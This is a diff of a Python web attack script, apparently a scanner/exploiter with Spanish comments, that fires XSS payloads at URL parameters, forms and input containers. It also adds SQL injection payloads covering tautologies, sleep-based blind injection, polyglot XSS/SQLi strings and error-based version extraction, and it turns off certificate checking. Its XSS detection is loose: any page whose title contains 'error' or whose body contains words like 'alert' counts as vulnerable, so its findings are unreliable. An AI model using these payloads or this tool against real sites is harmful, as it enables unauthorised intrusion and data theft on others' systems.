@@ -120,42 +120,93 @@ def find_urls_to_test(url, base_url):
     
     return links
 
-def get_forms(response):
+def get_forms_and_inputs(response, max_attempts=3):
     soup = BeautifulSoup(response.text, 'html.parser')
-    return soup.find_all('form')
 
+    # Buscar formularios y sus inputs
+    forms = soup.find_all('form')
+
+    # Buscar inputs en otros contenedores como 'div', 'section', etc.
+    containers_with_inputs = []
+    containers = soup.find_all(['div', 'section', 'article'])
+    for container in containers:
+        if container.find_all(['input', 'textarea', 'button']):
+            containers_with_inputs.append(container)
+
+    # Intentar de nuevo si no se encontraron formularios ni inputs
+    attempt = 1
+    while not forms and not containers_with_inputs and attempt <= max_attempts:
+        time.sleep(1)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
+        containers_with_inputs = []
+        containers = soup.find_all(['div', 'section', 'article'])
+        for container in containers:
+            if container.find_all(['input', 'textarea', 'button']):
+                containers_with_inputs.append(container)
+        attempt += 1
+
+    result = {
+        'forms': forms,
+        'containers_with_inputs': containers_with_inputs
+    }
+    return result
 
 def exploit_xss(url):
     for payload in xss_payloads:
         target_url = f"{url}?input={payload}"
         try:
             r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
+            
             if payload in r.text:
                 print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}")
                 return True
+
+            soup = BeautifulSoup(r.text, 'html.parser')
+            title = soup.title.string if soup.title else ""
+            if "error" in title.lower():
+                print(Fore.GREEN + f"[+] XSS vulnerability found in error message with payload: {payload}"+ Style.RESET_ALL)
+                return True
+
+            error_message = soup.find('div', class_='message') or soup.find('div', class_='error')
+            if error_message and payload in error_message.text:
+                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
+                return True
+
+            if any(keyword in r.text.lower() for keyword in ['alert', 'onerror', 'onload']):
+                print(Fore.GREEN + f"[+] XSS vulnerability found in form with payload: {payload}"+ Style.RESET_ALL)
+                return True
+
         except SSLError as e:
             print(f"[-] SSL Error on {target_url}: {e}")
         except requests.RequestException as e:
             print(f"[-] Request error on {target_url}: {e}")
+
     print("[-] No XSS vulnerabilities found in URL.")
     return False
+
 
 def submit_xss_payloads_to_forms(url):
     response = get_response(url)
     if not response:
         return False
 
-    soup = BeautifulSoup(response.text, 'html.parser')
-    forms = soup.find_all('form')
-    if not forms:
-        print("[-] No forms found on the page.")
-        return False
+    forms_and_inputs = get_forms_and_inputs(response)
+    forms = forms_and_inputs.get('forms', [])
+    containers_with_inputs = forms_and_inputs.get('containers_with_inputs', [])
     
+    if not forms and not containers_with_inputs:
+        print("[-] No forms or inputs found on the page.")
+        return False
+
+    #print(f"Forms found: {len(forms)}")
+    #print(f"Containers with inputs found: {len(containers_with_inputs)}")
+
     for form in forms:
         action = form.get('action')
         method = form.get('method', 'get').lower()
         form_url = urljoin(url, action)
-        
+
         inputs = form.find_all('input')
         form_data = {}
         for input_tag in inputs:
@@ -168,12 +219,31 @@ def submit_xss_payloads_to_forms(url):
                 r = requests.post(form_url, data=form_data, verify=False, proxies=proxies)
             else:
                 r = requests.get(form_url, params=form_data, verify=False, proxies=proxies)
-            
+
             if payload in r.text:
-                print(f"[+] XSS vulnerability found in form with payload: {payload}")
+                print(Fore.GREEN + f"[+] XSS vulnerability found in form with payload: {payload}" + Style.RESET_ALL)
+        
                 return True
 
-    print("[-] No XSS vulnerabilities found in forms.")
+    for container in containers_with_inputs:
+        inputs = container.find_all(['input', 'textarea', 'button'])
+        if not inputs:
+            continue
+
+        form_data = {}
+        for i, input_tag in enumerate(inputs):
+            input_name = input_tag.get('name') or f'temp_name_{i}'
+            form_data[input_name] = random.choice(xss_payloads)
+
+        print(f"Prepared form data for container: {form_data}")
+
+        for payload in xss_payloads:
+            r = requests.get(url, params=form_data, verify=False, proxies=proxies)
+            if payload in r.text:
+                print(Fore.GREEN + f"[+] XSS vulnerability found in container with payload: {payload}")
+                return True
+
+    print("[-] No XSS vulnerabilities found in forms or containers.")
     return False
 
 def exploit_database_version(url):
@@ -374,7 +444,6 @@ def exploit_sqli(url):
         - Returns True if a vulnerable URL is identified, otherwise returns False.
     """
     
-    # List of common SQL injection payloads
     payloads = [
         "' OR '1'='1",
         "' OR '1'='1' --",
@@ -390,7 +459,10 @@ def exploit_sqli(url):
         " ' or sleep(1) or '",
         ' " or sleep(1) or " ',
         " sleep(3)",
-        " sleep(3)/*' or sleep(3) or '' or sleep(3) or'*/" 
+        """ sleep(3)/*' or sleep(3) or '" or sleep(3) or"*/""", 
+        "/*‘ or ‘’=‘“ or “”=“*/",
+        """/*!SLEEP(1)*/ /*/alert(1)/*/*/""",
+        """/*! SLEEP(1) */ /*/ onclick=alert(1)//<button value=Click_Me /**/ or /*! or SLEEP(1) or */ /*/, onclick=alert(1)//> /**/ or /*! or SLEEP(1) or */, onclick=alert(1)// /**/ /**/ /**/""",
         "'",
         '"',
         "`",
@@ -403,7 +475,6 @@ def exploit_sqli(url):
         "(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))"
     ]
 
-    # Try each payload against the target URL
     for payload in payloads:
         target_url = url + payload
         try:
